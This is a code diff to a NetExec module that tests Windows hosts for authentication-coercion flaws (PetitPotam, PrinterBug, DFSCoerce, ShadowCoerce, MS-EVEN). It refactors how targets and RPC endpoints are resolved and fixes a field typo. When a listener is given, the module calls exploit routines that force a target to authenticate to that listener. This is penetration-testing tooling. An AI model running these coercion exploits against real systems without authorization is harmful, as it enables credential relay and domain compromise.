@@ -1,4 +1,5 @@
 from impacket.dcerpc.v5 import transport, rprn, even, epm
+from impacket.dcerpc.v5.rrp import DCERPCSessionError  # ruff: ignore[unused-import] solves an issue with error handling of impacket not displaying the correct exception
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
 from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
@@ -47,14 +48,13 @@ class NXCModule:
             """DFSCOERCE START"""
             try:
                 dfscocerceclass = DFSCoerceTrigger(context)
-                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 dfscocerceconnect = dfscocerceclass.connect(
                     username=connection.username,
                     password=connection.password,
                     domain=connection.domain,
                     lmhash=connection.lmhash,
                     nthash=connection.nthash,
-                    target=target,
+                    target=connection.remoteName,
                     doKerberos=connection.kerberos,
                     dcHost=connection.kdcHost,
                     aesKey=connection.aesKey,
@@ -78,14 +78,13 @@ class NXCModule:
             """ ShadowCoerce START """
             try:
                 shadowcocerceclass = ShadowCoerceTrigger(context)
-                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 shadowcocerceconnect = shadowcocerceclass.connect(
                     username=connection.username,
                     password=connection.password,
                     domain=connection.domain,
                     lmhash=connection.lmhash,
                     nthash=connection.nthash,
-                    target=target,
+                    target=connection.remoteName,
                     doKerberos=connection.kerberos,
                     dcHost=connection.kdcHost,
                     aesKey=connection.aesKey,
@@ -113,14 +112,13 @@ class NXCModule:
                 context.log.debug(f"Trying to connect to {pipe} pipe")
                 try:
                     petitpotamclass = PetitPotamtTrigger(context)
-                    target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                     petitpotamconnect = petitpotamclass.connect(
                         username=connection.username,
                         password=connection.password,
                         domain=connection.domain,
                         lmhash=connection.lmhash,
                         nthash=connection.nthash,
-                        target=target,
+                        target=connection.remoteName,
                         doKerberos=connection.kerberos,
                         dcHost=connection.kdcHost,
                         aesKey=connection.aesKey,
@@ -150,14 +148,13 @@ class NXCModule:
             for pipe in pipes:
                 try:
                     printerbugclass = PrinterBugTrigger(context)
-                    target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                     printerbugconnect = printerbugclass.connect(
                         username=connection.username,
                         password=connection.password,
                         domain=connection.domain,
                         lmhash=connection.lmhash,
                         nthash=connection.nthash,
-                        target=target,
+                        target=connection.remoteName,
                         doKerberos=connection.kerberos,
                         dcHost=connection.kdcHost,
                         aesKey=connection.aesKey,
@@ -168,7 +165,7 @@ class NXCModule:
                         context.log.debug("Target is vulnerable to PrinterBug")
                         context.log.highlight("VULNERABLE, PrinterBug")
                         if self.listener is not None:  # exploit
-                            exploit_status = printerbugclass.exploit(printerbugconnect, self.listener, target, self.always_continue, pipe)
+                            exploit_status = printerbugclass.exploit(printerbugconnect, self.listener, connection.remoteName, self.always_continue, pipe)
                             if not self.always_continue and exploit_status:
                                 break
                         printerbugconnect.disconnect()
@@ -183,14 +180,13 @@ class NXCModule:
             """ MSEVEN START """
             try:
                 msevenclass = MSEvenTrigger(context)
-                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 msevenconnect = msevenclass.connect(
                     username=connection.username,
                     password=connection.password,
                     domain=connection.domain,
                     lmhash=connection.lmhash,
                     nthash=connection.nthash,
-                    target=target,
+                    target=connection.remoteName,
                     doKerberos=connection.kerberos,
                     dcHost=connection.kdcHost,
                     aesKey=connection.aesKey,
@@ -212,14 +208,14 @@ class NXCModule:
             context.log.error("Invalid method, please check the method name.")
             return
 
-    @staticmethod
-    def get_dynamic_endpoint(interface: bytes, target: str, timeout: int = 5) -> str:
-        string_binding = rf"ncacn_ip_tcp:{target}[135]"
-        rpctransport = transport.DCERPCTransportFactory(string_binding)
-        rpctransport.set_connect_timeout(timeout)
-        dce = rpctransport.get_dce_rpc()
-        dce.connect()
-        return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
+
+def get_dynamic_endpoint(interface: bytes, target: str, timeout: int = 5) -> str:
+    string_binding = rf"ncacn_ip_tcp:{target}[135]"
+    rpctransport = transport.DCERPCTransportFactory(string_binding)
+    rpctransport.set_connect_timeout(timeout)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+    return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
 
 
 class ShadowCoerceTrigger:
@@ -541,7 +537,7 @@ class PetitPotamtTrigger:
         # activates EFS
         # https://specterops.io/blog/2025/08/19/will-webclient-start/
         with contextlib.suppress(Exception):
-            NXCModule.get_dynamic_endpoint(uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "0.0")), target, timeout=1)
+            get_dynamic_endpoint(uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "0.0")), target, timeout=1)
 
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         rpctransport.set_dport(445)
@@ -778,11 +774,12 @@ class PrinterBugTrigger:
                 "port": 445
             },
             "[dcerpc]": {
-                "stringBinding": NXCModule.get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target),
                 "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                 "port": None
             }
         }
+        if pipe == "[dcerpc]":
+            binding_params["[dcerpc]"]["stringBinding"] = get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target)
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         if binding_params[pipe]["port"] is not None:
             rpctransport.set_dport(binding_params[pipe]["port"])
@@ -1082,7 +1079,7 @@ class EFS_HASH_BLOB(NDRSTRUCT):
 
 class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
     structure = (
-        ("Lenght", DWORD),
+        ("Length", DWORD),
         ("SID", RPC_SID),
         ("Hash", EFS_HASH_BLOB),
         ("Display", LPWSTR),
